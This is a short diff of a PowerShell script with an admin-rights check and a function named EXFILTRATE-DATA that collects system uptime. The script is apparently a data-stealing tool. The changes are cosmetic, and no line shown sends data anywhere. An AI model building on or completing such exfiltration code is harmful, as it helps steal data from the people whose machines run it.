@@ -1,4 +1,4 @@
-﻿function CHECK_IF_ADMIN {
+function CHECK_IF_ADMIN {
     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
 }
 
@@ -34,7 +34,7 @@ function EXFILTRATE-DATA {
 	# System Uptime
 	function Get-Uptime {
     $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
-    $uptimedata = '{0} day(s) {1} hour(s) {2} minute(s) {3} second(s)' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
+    $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
     $uptimedata
     }
     $uptime = Get-Uptime
